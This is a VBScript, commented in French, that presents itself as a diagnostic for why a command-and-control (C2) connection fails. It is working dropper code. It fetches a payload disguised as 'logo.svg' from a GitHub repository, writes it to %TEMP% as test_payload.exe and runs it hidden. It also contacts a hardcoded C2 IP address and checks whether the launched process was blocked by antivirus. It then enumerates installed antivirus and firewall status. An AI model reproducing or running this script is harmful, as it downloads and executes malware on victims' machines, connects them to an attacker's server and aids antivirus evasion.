' ================================================================
' DIAGNOSTIC COMPLET v2.0 - Analyse pourquoi C2 ne monte pas
' ================================================================
Option Explicit
On Error Resume Next

Dim ws, fs, wmi, report, logPath
Set ws = CreateObject("WScript.Shell")
Set fs = CreateObject("Scripting.FileSystemObject")
Set wmi = GetObject("winmgmts:\\.\root\cimv2")

logPath = ws.ExpandEnvironmentStrings("%USERPROFILE%") & "\Desktop\DIAGNOSTIC_C2.txt"
report = "=== DIAGNOSTIC C2 - " & Now & " ===" & vbCrLf & vbCrLf

' ================================================================
' TEST 1: Connexion Internet
' ================================================================
report = report & "[1] TEST INTERNET" & vbCrLf
Dim http
Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
http.SetTimeouts 10000, 10000, 10000, 10000

http.Open "GET", "https://www.google.com", False
http.Send
report = report & "  Google: " & http.Status & vbCrLf

http.Open "GET", "https://raw.githubusercontent.com/sophieduval/der/main/logo.svg", False
http.Send
report = report & "  GitHub Payload: " & http.Status & " (" & LenB(http.responseBody) & " bytes)" & vbCrLf

' ================================================================
' TEST 2: Connexion C2 directe
' ================================================================
report = report & vbCrLf & "[2] TEST C2 (51.20.107.164:443)" & vbCrLf
On Error Resume Next
Dim tcp
Set tcp = CreateObject("MSWinsock.Winsock")
If Err.Number <> 0 Then
    report = report & "  Winsock: Non disponible (normal)" & vbCrLf
    Err.Clear
    
    ' Alternative: test HTTP to C2
    http.Open "GET", "https://51.20.107.164:443", False
    http.Send
    If Err.Number = 0 Then
        report = report & "  HTTPS C2: " & http.Status & vbCrLf
    Else
        report = report & "  HTTPS C2: Erreur - " & Err.Description & vbCrLf
        Err.Clear
    End If
End If

' ================================================================
' TEST 3: Telechargement Payload
' ================================================================
report = report & vbCrLf & "[3] TEST TELECHARGEMENT" & vbCrLf
Dim destPath, stm
destPath = ws.ExpandEnvironmentStrings("%TEMP%") & "\test_payload.exe"

http.Open "GET", "https://raw.githubusercontent.com/sophieduval/der/main/logo.svg", False
http.Send
report = report & "  Download status: " & http.Status & vbCrLf
report = report & "  Size: " & LenB(http.responseBody) & " bytes" & vbCrLf

If http.Status = 200 Then
    Set stm = CreateObject("ADODB.Stream")
    stm.Type = 1
    stm.Open
    stm.Write http.responseBody
    stm.SaveToFile destPath, 2
    stm.Close
    Set stm = Nothing
    
    If fs.FileExists(destPath) Then
        report = report & "  Fichier cree: OUI (" & fs.GetFile(destPath).Size & " bytes)" & vbCrLf
    Else
        report = report & "  Fichier cree: NON" & vbCrLf
    End If
End If

' ================================================================
' TEST 4: Execution
' ================================================================
report = report & vbCrLf & "[4] TEST EXECUTION" & vbCrLf
If fs.FileExists(destPath) Then
    report = report & "  Lancement du payload..." & vbCrLf
    
    Dim result
    result = ws.Run("""" & destPath & """", 0, False)
    report = report & "  ws.Run result: " & result & vbCrLf
    
    If Err.Number <> 0 Then
        report = report & "  ERREUR: " & Err.Description & vbCrLf
        Err.Clear
    Else
        report = report & "  Lancement: OK" & vbCrLf
    End If
    
    WScript.Sleep 5000
    
    ' Check if process is running
    Dim procs, proc, found
    found = False
    Set procs = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE ExecutablePath LIKE '%test_payload%'")
    For Each proc In procs
        found = True
        report = report & "  Process trouve: " & proc.Name & " (PID: " & proc.ProcessId & ")" & vbCrLf
    Next
    
    If Not found Then
        report = report & "  Process: NON TROUVE (peut-etre bloque par AV)" & vbCrLf
    End If
End If

' ================================================================
' TEST 5: Antivirus
' ================================================================
report = report & vbCrLf & "[5] ANTIVIRUS INSTALLE" & vbCrLf
Dim av, prod
On Error Resume Next
Set av = GetObject("winmgmts:\\.\root\SecurityCenter2").ExecQuery("SELECT * FROM AntiVirusProduct")
If Err.Number = 0 Then
    For Each prod In av
        report = report & "  - " & prod.displayName & vbCrLf
    Next
Else
    report = report & "  Impossible de detecter" & vbCrLf
    Err.Clear
End If

' ================================================================
' TEST 6: Firewall
' ================================================================
report = report & vbCrLf & "[6] FIREWALL" & vbCrLf
Dim fwMgr, fwProfile
Set fwMgr = CreateObject("HNetCfg.FwMgr")
Set fwProfile = fwMgr.LocalPolicy.CurrentProfile
report = report & "  Firewall actif: " & fwProfile.FirewallEnabled & vbCrLf

' ================================================================
' SAVE REPORT
' ================================================================
report = report & vbCrLf & "=== FIN DIAGNOSTIC ===" & vbCrLf

Dim ts
Set ts = fs.CreateTextFile(logPath, True)
ts.Write report
ts.Close

MsgBox "Diagnostic termine!" & vbCrLf & vbCrLf & "Rapport: " & logPath, vbInformation, "Diagnostic C2"

' Cleanup
Set ws = Nothing
Set fs = Nothing
Set wmi = Nothing
Set http = Nothing
